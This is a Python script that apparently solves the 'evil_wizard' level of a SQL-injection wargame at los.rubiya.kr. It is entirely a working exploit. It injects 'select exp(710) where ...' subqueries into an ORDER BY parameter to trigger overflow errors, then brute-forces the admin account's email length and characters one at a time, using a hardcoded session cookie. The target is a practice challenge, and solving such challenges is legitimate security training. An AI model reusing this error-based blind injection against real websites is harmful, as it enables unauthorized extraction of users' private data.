import requests
from tqdm import tqdm

url = 'https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php'
cookie = {'PHPSESSID':'p1kvii3bfb7ss2oootmtub86nn'}
email_length = 0
email = ''

for i in range(1, 50):
    query = f"?order=(select exp(710) where {i} = (select length(email) where id = 'admin'))"
    payload = url+query
    r = requests.get(payload, cookies=cookie)
    # print(r.text)
    if "rubiya805@gmail.com" not in r.text:
        email_length = i
        break

print(f"email_length : {email_length}")

for i in tqdm(range(1, email_length+1)):
    for j in range(33, 127):
        query = f"?order=(select exp(710) where {j} = (select ord(substr(email,{i},1)) where id = 'admin'))"
        payload = url+query
        r = requests.get(payload, cookies=cookie)
        # print(r.text)
        if "rubiya805@gmail.com" not in r.text:
            email += chr(j)
            break
    print(f"email : {email}")
    
print(f"email : {email}")